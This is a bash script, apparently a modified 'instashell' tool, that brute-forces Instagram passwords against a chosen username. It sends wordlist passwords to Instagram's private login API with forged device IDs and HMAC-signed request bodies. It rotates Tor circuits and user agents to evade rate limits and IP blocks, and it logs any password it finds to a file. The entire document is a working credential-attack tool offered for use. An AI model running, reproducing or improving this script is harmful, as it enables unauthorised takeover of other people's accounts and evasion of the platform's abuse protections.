#!/bin/bash
# Coded by: github.com/dhasirar
# Instagram: @dhasirar

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"

user_agents=(
  "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
  "Instagram 12.0.0.7.91 Android (23/6.0.1; 640dpi; 1440x2560; Samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)"
  "Instagram 13.0.0.1.91 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)"
  "Instagram 14.0.0.9.90 Android (25/7.1.1; 440dpi; 1080x1920; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)"
  "Instagram 15.0.0.11.90 Android (26/8.0.0; 480dpi; 1080x1920; Xiaomi; MI 6; sagit; qcom; en_US)"
)

function get_random_ua() {
  local idx=$((RANDOM % ${#user_agents[@]}))
  echo "${user_agents[$idx]}"
}

current_ua=$(get_random_ua)
var=$(curl -i -s -H "$header" -A "$current_ua" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}
#!/bin/bash

banner() {
  clear
  printf "\e[1;97m     _                              \e[0m\n"
  printf "\e[1;96m _  | |                _            \e[0m\n"
  printf "\e[1;95m( \ | | ____    ___  _| |_  _____   \e[0m\n"
  printf "\e[1;93m ) )| ||  _ \  /___)(_   _)(____ |  \e[0m\n"
  printf "\e[1;95m(_/ | || | | ||___ |  | |_ / ___ |  \e[0m\n"
  printf "\e[1;96m    |_||_| |_|(___/    \__)\_____|  \e[0m\n"

  printf "\n"

  colors=(31 32 33 34 35 36 37)
  text="Welcome to TRHACKNON Mod'z of Instagram Brute Force Tool [Interactive Edition]"
  textt="
 +-+-+-+-+-+-+ +-+-+ +-+
 |E|x|p|e|c|t| |U|s| |!|
 +-+-+-+-+-+-+ +-+-+ +-+
"


  for (( i=0; i<${#textt}; i++ )); do
    color=${colors[$RANDOM % ${#colors[@]}]}
    printf "\e[1;${color}m${textt:$i:1}\e[0m"
    sleep 0.1
  done
  printf "\n\n"
}


function check_instagram_profile() {
    local username=$1
    local profile_data=$(curl -L -s "https://www.instagram.com/$username/" -H "User-Agent: Mozilla/5.0")
    
    if echo "$profile_data" | grep -q "Page Not Found"; then
        return 1
    fi
    
    printf "\e[1;92m[*] Profil trouvé:\e[0m\n"
    printf "\e[1;92m[*] Username:\e[0m \e[1;77m%s\e[0m\n" "$username"
    if echo "$profile_data" | grep -q "is_private.:true"; then
        printf "\e[1;92m[*] Status:\e[0m \e[1;77mPrivé\e[0m\n\n"
    else
        printf "\e[1;92m[*] Status:\e[0m \e[1;77mPublic\e[0m\n\n"
    fi
    return 0
}

function start() {
banner

#checkroot
dependencies
read -p $'\e[1;92mUsername account: \e[0m' user

printf "\e[1;77m[*] Vérification du profil Instagram...\e[0m\n"
if ! check_instagram_profile "$user"; then
    printf "\e[1;91m[!] Profil invalide! Réessayez\e[0m\n"
    sleep 1
    start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $countpass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {
  killall -HUP tor
  sleep 3
  check_new_ip
}

function check_new_ip() {
  local max_attempts=5
  local attempt=1

  while [ $attempt -le $max_attempts ]; do
    if curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; then
      return 0
    fi
    printf "\e[1;91m[!] Tentative de reconnexion Tor %s/%s\e[0m\n" $attempt $max_attempts
    sleep 2
    ((attempt++))
  done

  printf "\e[1;91m[!] Impossible de se reconnecter à Tor\e[0m\n"
  exit 1
}

function bruteforcer() {

checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [[ "$token" -lt "$count_pass" ]]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
current_ua=$(get_random_ua)
useragent='User-Agent: "'$current_ua'"'

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

{(trap '' SIGINT && 
response=$(curl --socks5-hostname 127.0.0.1:9050 \
  -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
  -s \
  --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' \
  -w "\n%{http_code}\n" \
  -H "$header" \
  "https://i.instagram.com/api/v1/accounts/login/")

http_code=$(echo "$response" | tail -n1)
response_body=$(echo "$response" | head -n -1)

if [[ "$http_code" == "200" ]]; then
  if echo "$response_body" | grep -q "logged_in_user"; then
    printf "\e[1;92m\n[✓] Mot de passe trouvé: %s\n" $pass
    printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
    printf "\e[1;92m[*] Sauvegardé dans:\e[0m\e[1;77m found.instashell\n\e[0m"
    kill -1 $$
  elif echo "$response_body" | grep -q "challenge_required"; then
    printf "\e[1;93m\n[!] Mot de passe trouvé mais challenge requis: %s\n" $pass
    printf "Username: %s, Password: %s (Challenge Required)\n" $user $pass >> found.instashell
    printf "\e[1;92m[*] Sauvegardé dans:\e[0m\e[1;77m found.instashell\n\e[0m"
    kill -1 $$
  fi
elif [[ "$http_code" == "429" ]]; then
  printf "\e[1;91m[!] Rate limit atteint - Changement d'IP\n\e[0m"
  changeip
elif [[ "$http_code" == "403" ]]; then
  if echo "$response_body" | grep -q "ip_block"; then
    printf "\e[1;91m[!] IP bloquée - Changement d'IP\n\e[0m"
    changeip
  fi
elif [[ "$http_code" == "400" ]]; then
  if echo "$response_body" | grep -q "bad_password"; then
    printf "\e[1;91m[-] Mauvais mot de passe: %s\n\e[0m" $pass
  fi
else
  printf "\e[1;91m[!] Erreur inconnue (HTTP %s) - Changement d'IP\n\e[0m" $http_code
  changeip
fi
) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}



function resume() {

banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=10
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"


count_pass=$(wc -l $wl_pass | cut -d " " -f1)

while [[ "$token" -lt "$count_pass" ]]; do
IFS=$'\n'
for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do
#for pass in $(sed -n '/\b'$pass'\b/,'$threads'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
let token++
{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
let token--
changeip
done
exit 1
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac
